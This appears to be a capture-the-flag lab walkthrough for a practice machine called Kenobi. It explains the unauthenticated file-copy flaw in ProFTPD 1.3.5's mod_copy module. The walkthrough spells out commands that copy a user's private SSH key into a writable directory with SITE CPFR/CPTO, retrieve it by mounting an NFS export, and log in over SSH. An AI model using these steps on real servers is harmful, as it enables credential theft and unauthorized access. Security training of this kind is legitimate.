
## **Theoretical Overview**

### **1. What is ProFTPD?**

- **ProFTPD (Professional FTP Daemon):**
    
    - An open-source **FTP server software** commonly used on Linux and Unix systems.
    - It allows users to upload, download, and manage files on a server via the **FTP protocol**.
- **FTP Basics:**
    
    - FTP servers run on **port 21** by default.
    - Users authenticate to access files and directories.
    - However, FTP servers are often misconfigured or left vulnerable to exploits.

---

### **2. What is mod_copy?**

- **mod_copy** is a module of ProFTPD.
    
    - Designed to allow authenticated users to **copy files or directories** from one location to another **on the same server**.
- **FTP Commands Used in mod_copy:**
    
    - **`SITE CPFR <source>` (Copy From):**
        - Specifies the file or directory you want to copy.
    - **`SITE CPTO <destination>` (Copy To):**
        - Specifies where the file or directory should be copied.

---

### **3. The Vulnerability in mod_copy**

- In **ProFTPD 1.3.5** and earlier, mod_copy has a critical flaw:
    - It **does not require authentication** for using `SITE CPFR` and `SITE CPTO`.
    - Any attacker with FTP access can copy **any file** on the system to a location they can access.

#### **Why This Happens:**

- The developers of ProFTPD did not correctly enforce user permissions in mod_copy.
- As a result:
    - Files like private SSH keys, sensitive configs, or password files can be copied.

---

### **4. Why Is This Useful?**

- **SSH Key Theft:**
    
    - A private SSH key is typically found in:
        - **`/home/<username>/.ssh/id_rsa`**
    - If an attacker steals this key, they can:
        - Authenticate as the user without knowing their password.
        - Log into the server via SSH with full access to the user’s account.
- **Writable Directories:**
    
    - Files cannot just be copied anywhere. To make use of them, the attacker needs:
        - A writable directory (e.g., `/var/tmp`).
        - A way to read or retrieve the file after copying.

---

### **5. NFS (Network File System)**

- **What is NFS?**
    
    - A protocol that allows files stored on a server to be accessed remotely like they are local files.
- **Why is NFS Relevant Here?**
    
    - The `/var` directory is exported over NFS.
    - This means the attacker can mount the directory on their own machine, giving them direct access to any files copied into `/var/tmp`.

---

## **What To Do (Practical Steps)**

Now that you understand the theory, here are the steps to exploit this vulnerability and retrieve the SSH private key.

---

### **1. Identify Writable Directories**

- From earlier tasks, we know that `/var/tmp` is writable by the attacker.
- This is where we’ll copy the SSH key.

---

### **2. Connect to the FTP Server**

- Use an FTP client (or command-line tools like `ftp` or `netcat`) to connect to the FTP server.

**Command:**

bash

Copy code

`nc <target-ip> 21`

---

### **3. Use mod_copy Commands to Copy the SSH Key**

- Once connected, use the following commands to exploit the vulnerability:

1. **Specify the Source File (the private key):**
    
    bash
    
    Copy code
    
    `SITE CPFR /home/kenobi/.ssh/id_rsa`
    
2. **Specify the Destination Directory (a writable location):**
    
    bash
    
    Copy code
    
    `SITE CPTO /var/tmp/id_rsa`
    

---

### **4. Mount the NFS Share**

- Now that the SSH key is copied to `/var/tmp`, use NFS to access it:

1. **Create a Mount Point on Your Machine:**
    
    bash
    
    Copy code
    
    `mkdir /mnt/kenobiNFS`
    
2. **Mount the Remote Directory:**
    
    bash
    
    Copy code
    
    `mount <target-ip>:/var /mnt/kenobiNFS`
    
3. **List Files in `/mnt/kenobiNFS/tmp`:**
    
    bash
    
    Copy code
    
    `ls -la /mnt/kenobiNFS/tmp`
    
    - You should see `id_rsa`.

---

### **5. Retrieve the SSH Key**

- Copy the key locally:
    
    bash
    
    Copy code
    
    `cp /mnt/kenobiNFS/tmp/id_rsa .`
    
- Set appropriate permissions for the key:
    
    bash
    
    Copy code
    
    `chmod 600 id_rsa`
    

---

### **6. Use the SSH Key to Log In**

- Log in to the Kenobi user’s account:
    
    bash
    
    Copy code
    
    `ssh -i id_rsa kenobi@<target-ip>`
    

---

### **7. Retrieve the User Flag**

- Once logged in as Kenobi:
    
    bash
    
    Copy code
    
    `cat /home/kenobi/user.txt`
    

---

### **Why Is This Vulnerability Significant?**

- It bypasses all authentication mechanisms.
- Attackers gain unauthorized access to sensitive data without any credentials.
- Exploiting this shows the importance of patching vulnerable software and auditing exposed services like FTP.